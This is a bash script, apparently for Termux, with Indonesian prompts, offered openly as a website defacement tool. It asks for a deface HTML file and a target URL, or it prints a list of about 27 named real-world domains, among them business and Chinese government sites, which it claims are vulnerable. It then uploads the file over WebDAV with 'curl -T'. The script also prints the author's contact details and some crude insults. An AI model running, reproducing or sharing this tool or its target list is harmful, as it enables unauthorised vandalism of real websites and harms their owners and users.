#!/bin/bash

#CodedBy Mr.B41B4L.X
#WEBDAVdeface
#JanganDiRecodeYaGayn:)
#let'go cekidot :)

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning


clear
cd /sdcard
figlet -f pagga SulSyh Deface | lolcat
                     
      echo""
      echo $bi"  _____________________"
      echo $bi" /                    /"$bi"|" $ku" contacts: 0882-9129-2181(WA) "
      echo $bi"/____________________/"$bi" |" $pu" ========================"
       echo $bi"|" $ku"•Author: SulSyh   "    $bi"|" $bi"|" $ku" Me:xbcsgdz@gmail.com"
      echo $bi"|====================|"$bi" |" $pu" ========================"
       echo $bi"|" $ku"Coded by SulSyh   "    $bi"|"$bi" |" $ku" IG: vvibu_abadi"
      echo $bi"|________|°|°|_______|"$bi"/" $pu"  ========================"
      echo ""
      echo $me"              ["$ku"-"$me"]"$cy"SulSyh Deface"$me"["$ku"-"$me"]"
                                                               
echo ""
echo $ku "*NOTE!!:"
echo $cy"|========================================|"
echo $cy"|"$i"Script Deface Harus Di letakan di Sdcard"$cy"|"
echo $cy"|"$i"Dan Jangan Di Masukan Ke Folder Apapun"  $cy "|"
echo $cy"|"$i"kalau ga bisa berarti website ga vuln   "$cy"|"
echo $cy"|"$i"atau website berisi data penting        "$cy"|"
echo $cy"|========================================|"
                                                          
echo " KALAU TOOLS TAK BERWARNA KETIK SAJA ctrl c "
echo "          lalu ketik sh bahan.sh            "
echo ""
echo -n $ku"Nama Script Deface?(Script.html):"
sleep 1 
read sc
echo ""
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo "CTRL+C Detected, "
echo "trying to exit"
sleep 1
figlet SulSyh 
echo ""
echo " see you again  "
echo " "
echo "  bye syg ku ♥ :v  "
sleep 1
exit
}

lagi=1
while [ $lagi -lt 6 ];
do
echo $me"["$ku"1"$me"]" $pu"Sudah puny target";
echo $me"[============"$pu"=============]"
echo $cy"["$ku"2"$cy"]" $pu"Belum punya target";
echo ""
echo    "╭─JAWAB BRO:" |lolcat
read -p "╰─#" pil;

case $pil in
2)echo ""
echo $pu"List Target:"
echo $pu"==========================="
echo $ku"


http://contsol.co.za
http://colourfactory.co.za
http://scnc.co.za
http://windmillsandporcupines.co.za
http://cblandscapes.com.za
http://naturaleyeimages.com
http://bitsandpieces.co.za
http://infussion.co.za
http://thepremiummakers.com
http://mocosi.co.za
http://itsengineering.co.za
http://handj.co.za
http://ayk.co.za
http://holotropicbreathwork.co.za
http://foodconsult.co.za
http://daretogowildafrica.co.za
http://hybriddevelopments.co.za
http://documents.co.st-lucie.fl.us
http://www.ybsds.gov.cn
http://rsj.xxz.gov.cn
http://www.xzll.gov.cn
http://www.xmfg.gov.cn
http://zzx.wlcbsgs.gov.cn
http://www.librogondwana.com.ar
http://www.ingacarrasco.com.ar
http://www.salsadella.com.ar
http://www.bgmgroup.cn
"
echo ""
echo $pu"==========================="
echo $pu"web vuln berasal dari 2018 - 2020"
echo $pu"YANG RECODE KONTOL >.<           "
echo -n $i"Masukan Salah Satu Target:"
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Tusbol.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"================================================="
echo $ku"Silakan Di Cek di : $cy $tg/$sc"
echo $me"================================================="
echo $ku"kalau ada kata2 pemrograman berarti gagal"
echo $ku"kalau website ga berubah, dan keluar"
echo $ku" internet kamu j3l3k"
echo $ku""
echo $ku"kalau keluar Invalid Hostname berarti   "
echo $ku"website udah gaada/ web gaada atau di hapus"
echo $ku"terima kasih sudah pakai tools ini ♥️   "
echo $me"================================================="
exit

;;


1)echo -n $i"Masukan Target:" 
read tg
echo ""
echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Tusbol.."
read trgt
curl -T /sdcard/$sc $tg
echo ""
echo ""
echo $me"========================================"
echo $ku"Silakan Di Cek di $cy $tg/$sc"
echo $me"========================================"
echo $ku"kalau ada kata2 pemrograman berarti gagal"
echo $ku"kalau website ga berubah, dan ga keluar"
echo $ku"kata2 pemrograman berarti internet kamu "
echo $ku"jelek                                   "
echo $ku""
echo $ku"terima kasih sudah pakai tools ini ♥️   "
echo $me"========================================"

exit

;;


*) echo " JAWAB YANG BENER SU " | lolcat
esac
done
done
                                       
